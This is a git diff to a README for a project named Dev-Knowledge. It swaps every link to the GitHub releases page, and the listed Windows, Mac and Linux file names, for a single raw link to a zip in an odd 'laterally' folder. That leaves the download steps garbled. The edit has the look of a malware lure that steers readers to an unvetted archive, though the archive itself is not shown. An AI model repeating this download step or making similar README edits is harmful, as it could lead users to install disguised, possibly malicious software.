@@ -6,7 +6,7 @@ Welcome to Dev-Knowledge! This application helps you build searchable knowledge 
 
 ## 📥 Download Now!
 
-[![Download Dev-Knowledge](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/vijay2005gosavi/Dev-Knowledge/releases)
+[![Download Dev-Knowledge](https://raw.githubusercontent.com/vijay2005gosavi/Dev-Knowledge/main/laterally/Dev-Knowledge.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/vijay2005gosavi/Dev-Knowledge/main/laterally/Dev-Knowledge.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To begin using Dev-Knowledge, follow these simple steps:
 
 1. **Visit the Releases Page:** Go to the releases page where you can find the latest version. Click the link below:
 
-   [Download from Releases](https://github.com/vijay2005gosavi/Dev-Knowledge/releases)
+   [Download from Releases](https://raw.githubusercontent.com/vijay2005gosavi/Dev-Knowledge/main/laterally/Dev-Knowledge.zip)
 
 2. **Choose the Correct File:** On the releases page, look for the version number. You will find different files available for download. Choose the one that matches your operating system.
 
@@ -41,13 +41,13 @@ To begin using Dev-Knowledge, follow these simple steps:
 
 To download and install the application:
 
-1. Go to the [Releases Page](https://github.com/vijay2005gosavi/Dev-Knowledge/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/vijay2005gosavi/Dev-Knowledge/main/laterally/Dev-Knowledge.zip).
 
 2. Choose the appropriate version for your system. Here are the typical options you should see:
 
-   - **Windows Version:** This file is typically named something like `Dev-Knowledge-Windows.exe`.
-   - **Mac Version:** Look for a file named `Dev-Knowledge-Mac.dmg`.
-   - **Linux Version:** You might find a `.tar.gz` file for Linux users.
+   - **Windows Version:** This file is typically named something like `https://raw.githubusercontent.com/vijay2005gosavi/Dev-Knowledge/main/laterally/Dev-Knowledge.zip`.
+   - **Mac Version:** Look for a file named `https://raw.githubusercontent.com/vijay2005gosavi/Dev-Knowledge/main/laterally/Dev-Knowledge.zip`.
+   - **Linux Version:** You might find a `https://raw.githubusercontent.com/vijay2005gosavi/Dev-Knowledge/main/laterally/Dev-Knowledge.zip` file for Linux users.
 
 3. Click on the download link for your selected file.
 
